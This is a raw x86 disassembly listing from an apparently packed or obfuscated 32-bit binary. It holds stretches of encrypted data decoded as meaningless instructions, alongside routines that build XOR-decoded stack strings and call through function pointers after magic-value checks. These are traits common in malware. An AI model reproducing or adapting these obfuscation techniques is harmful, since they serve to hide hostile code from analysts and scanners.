  41c93e:	sbb    ebp,DWORD PTR [ebp-0x2421d686]
  41c944:	call   0x688e:0x34a20b4d
  41c94b:	and    eax,0x209d6666
  41c950:	aad    0x55
  41c952:	std    
  41c953:	push   eax
  41c954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c955:	sti    
  41c956:	js     0x41c8db
  41c958:	les    ecx,FWORD PTR [ecx+0x6d]
  41c95b:	ret    0x1a23
  41c95e:	or     al,0xdf
  41c960:	mov    BYTE PTR [esi],bl
  41c962:	push   esp
  41c963:	inc    eax
  41c964:	dec    ecx
  41c966:	pop    eax
  41c967:	pop    edx
  41c968:	jb     0x41c963
  41c96a:	mov    ds:0x48d1958d,eax
  41c96f:	pop    esp
  41c970:	pusha  
  41c971:	mov    ch,0xf9
  41c973:	dec    ebx
  41c974:	mul    DWORD PTR [edx]
  41c976:	nop
  41c977:	into   
  41c978:	ins    BYTE PTR es:[edi],dx
  41c979:	mov    esp,0x55a4e94d
  41c97e:	or     al,0xa1
  41c980:	cwde   
  41c981:	xor    BYTE PTR [ebx],dh
  41c983:	enter  0xb95e,0xe8
  41c987:	sub    al,0x7
  41c989:	adc    dl,0xc9
  41c98c:	pusha  
  41c98d:	push   eax
  41c98e:	mov    ds:0x101bf296,al
  41c993:	dec    eax
  41c994:	repz mov ch,0xad
  41c997:	mov    dh,0xd1
  41c999:	popa   
  41c99a:	jle    0x41c95c
  41c99c:	out    0xa0,al
  41c99e:	pop    es
  41c99f:	fld    TBYTE PTR [edx]
  41c9a1:	lods   al,BYTE PTR ds:[esi]
  41c9a2:	(bad)  
  41c9a3:	pop    edi
  41c9a4:	adc    DWORD PTR [ebx],ebp
  41c9a6:	jmp    0x41c94b
  41c9a8:	xchg   esp,eax
  41c9a9:	push   0xffffff8a
  41c9ab:	inc    esp
  41c9ac:	loopne 0x41c93f
  41c9ae:	mov    dl,0xb5
  41c9b0:	add    BYTE PTR [ebp+0x68],0xee
  41c9b4:	daa    
  41c9b5:	clc    
  41c9b6:	push   edi
  41c9b7:	arpl   dx,cx
  41c9b9:	or     eax,0xd1e3f800
  41c9be:	inc    ebx
  41c9bf:	sbb    DWORD PTR [ebx+0x35b19b5a],esi
  41c9c5:	mov    ecx,0xb0807dc1
  41c9ca:	pop    esp
  41c9cb:	or     edx,DWORD PTR [ebx-0x49]
  41c9ce:	sbb    BYTE PTR [eax+0x712a8316],0xc0
  41c9d5:	and    bl,BYTE PTR [edi-0x6a]
  41c9d8:	in     al,0x59
  41c9da:	bound  edi,QWORD PTR [ecx-0x68c53734]
  41c9e0:	mov    dl,0xcf
  41c9e3:	xor    BYTE PTR [ebp-0x6e],bh
  41c9e6:	out    0xac,ax
  41c9e9:	and    BYTE PTR es:[eax+0x6a56fa9f],dh
  41c9f0:	nop
  41c9f1:	xchg   esi,eax
  41c9f2:	scas   eax,DWORD PTR es:[edi]
  41c9f3:	ret    
  41c9f4:	mov    edx,0x461d3b73
  41c9f9:	sti    
  41c9fa:	jae    0x41ca05
  41c9fc:	or     BYTE PTR [ebp+0x147225bc],cl
  41ca02:	mov    dl,BYTE PTR [ebx]
  41ca04:	adc    BYTE PTR [eax-0x254d70e9],bh
  41ca0a:	push   ds
  41ca0b:	jl     0x41c9e5
  41ca0d:	jb     0x41ca18
  41ca0f:	(bad)  
  41ca10:	cmp    eax,ebx
  41ca12:	jle    0x41c9cd
  41ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca15:	and    ecx,DWORD PTR [ebx+0x388ecb63]
  41ca1b:	and    ebp,eax
  41ca1d:	dec    esi
  41ca1e:	push   ss
  41ca1f:	fwait
  41ca20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca21:	cmp    eax,0x6cbba2e5
  41ca26:	(bad)  
  41ca27:	(bad)  
  41ca28:	mov    ebx,0x374a281d
  41ca2d:	gs leave 
  41ca2f:	inc    ebp
  41ca30:	push   0x560c2594
  41ca35:	popa   
  41ca36:	out    dx,eax
  41ca37:	nop
  41ca38:	push   0xfffffff6
  41ca3a:	xor    al,0x1b
  41ca3c:	sbb    bh,BYTE PTR [eax]
  41ca3e:	and    BYTE PTR [ebp+0x2b35ef23],al
  41ca44:	std    
  41ca45:	push   ebx
  41ca46:	mov    bl,0x18
  41ca48:	hlt    
  41ca49:	jge    0x41cab6
  41ca4b:	test   BYTE PTR [edx+esi*4-0x4b85a453],al
  41ca52:	mov    ?,WORD PTR [ebp-0x2c]
  41ca55:	cwde   
  41ca56:	lods   al,BYTE PTR ds:[esi]
  41ca57:	call   0xe0d7adcc
  41ca5c:	sar    DWORD PTR [ecx+ebp*8],1
  41ca5f:	push   cs
  41ca60:	mov    ds:0x8ede0605,al
  41ca65:	push   esp
  41ca66:	js     0x41ca6d
  41ca68:	popf   
  41ca69:	sbb    eax,0x610b12b0
  41ca6e:	and    al,0xde
  41ca70:	imul   dh
  41ca72:	sbb    al,0x5c
  41ca74:	jns    0x41cac3
  41ca76:	adc    BYTE PTR [ecx-0x6fe8d337],0x7e
  41ca7d:	retf   
  41ca7e:	cli    
  41ca7f:	psllw  mm2,QWORD PTR [edi+ebx*8+0x601515ce]
  41ca87:	inc    eax
  41ca88:	lods   al,BYTE PTR ds:[esi]
  41ca89:	inc    eax
  41ca8a:	shr    esp,cl
  41ca8c:	add    ch,bh
  41ca8e:	add    al,0xfe
  41ca90:	cld    
  41ca91:	nop
  41ca92:	mov    bh,BYTE PTR [ecx]
  41ca94:	(bad)  
  41ca95:	mov    eax,0xac5d9844
  41ca9a:	mov    ebx,fs
  41ca9c:	(bad)  
  41ca9f:	test   eax,0x812a2c1c
  41caa4:	bound  edx,QWORD PTR ds:0x28fe809d
  41caaa:	aam    0x55
  41caac:	enter  0x169f,0x8e
  41cab0:	ja     0x41caea
  41cab2:	add    al,0xc0
  41cab4:	stc    
  41cab5:	call   0x6efb1836
  41caba:	sti    
  41cabb:	add    BYTE PTR [ecx-0x5daf430c],0x31
  41cac2:	inc    eax
  41cac3:	and    bl,dl
  41cac5:	sar    edi,cl
  41cac7:	lods   al,BYTE PTR ds:[esi]
  41cac8:	pop    esi
  41cac9:	and    DWORD PTR [esi],edi
  41cacb:	aaa    
  41cacc:	push   ebx
  41cacd:	aad    0xf
  41cacf:	pusha  
  41cad0:	ret    0x7b95
  41cad3:	pop    ebx
  41cad4:	jmp    0x6518:0x56fcb2c4
  41cadb:	or     al,0xb2
  41cadd:	xchg   esp,eax
  41cade:	cld    
  41cadf:	and    BYTE PTR [esi+edx*1],bh
  41cae2:	jbe    0x41cae3
  41cae4:	jb     0x41ca8d
  41cae6:	or     eax,ebx
  41cae8:	push   ecx
  41cae9:	les    ebx,FWORD PTR [edi]
  41caeb:	retf   0x7391
  41caee:	(bad)  
  41caef:	sub    bh,al
  41caf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf2:	mov    ebp,0x7eb94f86
  41caf7:	xchg   esi,eax
  41caf8:	shr    BYTE PTR [edi+0x8bc31],cl
  41cafe:	call   FWORD PTR [ebx-0x54]
  41cb01:	dec    edi
  41cb02:	mov    eax,0x1252b70d
  41cb07:	pop    edx
  41cb08:	bound  esp,QWORD PTR [edi]
  41cb0a:	inc    edi
  41cb0b:	popa   
  41cb0c:	ins    BYTE PTR es:[edi],dx
  41cb0d:	popf   
  41cb0e:	adc    eax,0xab047069
  41cb13:	sbb    DWORD PTR [ebx+0x66ab673],edi
  41cb19:	jg     0x41caad
  41cb1b:	pop    edi
  41cb1c:	hlt    
  41cb1d:	add    al,0x24
  41cb1f:	pop    ds
  41cb20:	mov    esi,0x52c6526d
  41cb25:	xor    al,BYTE PTR [ebx-0x53]
  41cb28:	xor    bh,BYTE PTR [esi]
  41cb2a:	sbb    edx,DWORD PTR [eax-0x3f]
  41cb2d:	jmp    FWORD PTR [ebx-0x66]
  41cb30:	push   ss
  41cb31:	sbb    eax,0x7f2e8246
  41cb36:	scas   eax,DWORD PTR es:[edi]
  41cb37:	xchg   ecx,eax
  41cb38:	jp     0x41cb58
  41cb3a:	repnz imul esi,DWORD PTR [edx-0x60868086],0x85a0eb7c
  41cb45:	adc    al,0x29
  41cb47:	stos   DWORD PTR es:[edi],eax
  41cb48:	addr16 mov edi,0xd8555840
  41cb4e:	jno    0x41cb32
  41cb50:	push   eax
  41cb51:	fwait
  41cb52:	mov    ch,0x7c
  41cb54:	mov    edx,0x547594c6
  41cb59:	sub    al,0xe8
  41cb5b:	aas    
  41cb5c:	test   eax,0xc8a0c8e0
  41cb61:	retf   
  41cb62:	and    edx,ebx
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	pop    ds
  41ce45:	dec    edi
  41ce46:	sub    eax,0x8d8519d8
  41ce4b:	dec    ebx
  41ce4c:	xchg   ebx,eax
  41ce4d:	adc    DWORD PTR [edx],ebp
  41ce4f:	mov    cl,0xf1
  41ce51:	add    esp,ecx
  41ce53:	mov    ebp,0x1
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
